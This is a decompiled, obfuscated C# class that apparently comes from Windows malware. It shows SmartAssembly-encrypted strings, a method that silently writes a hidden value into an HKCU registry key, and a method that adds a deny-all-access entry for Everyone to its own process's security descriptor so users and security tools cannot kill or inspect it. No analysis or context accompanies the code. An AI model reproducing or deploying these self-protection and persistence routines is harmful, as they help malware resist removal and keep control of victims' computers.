using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace FEPAnxLYcpgz;

internal sealed class oqjzKJtZwbr
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr ySasHUeyRXetiO, int snjEGUCALNeyP, [Out] byte[] ZZqIrvPZcZmRMrWSs, uint WVgQGfzCmN, out uint IauevQXXOLFZcGw);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr SAXVhgFbFbQbN, int BKVzedAwumHcnHf, [In] byte[] QfJJusNBOnaMY);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void GTTzroEFHh(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(getString_0(107446426)));
			registryKey.SetValue(ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(getString_0(107446865)), getString_0(107395946));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor cpySKtCrLQ(IntPtr intptr_0)
	{
		byte[] zZqIrvPZcZmRMrWSs = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, zZqIrvPZcZmRMrWSs, 0u, out var IauevQXXOLFZcGw);
		if ((long)IauevQXXOLFZcGw > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, zZqIrvPZcZmRMrWSs = new byte[IauevQXXOLFZcGw], IauevQXXOLFZcGw, out IauevQXXOLFZcGw))
		{
			return null;
		}
		return new RawSecurityDescriptor(zZqIrvPZcZmRMrWSs, 0);
	}

	private void qzEcjiVdpYXDh(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void BoirxYTJRZxQbKh()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = cpySKtCrLQ(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			qzEcjiVdpYXDh(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static oqjzKJtZwbr()
	{
		Strings.CreateGetStringDelegate(typeof(oqjzKJtZwbr));
	}
}
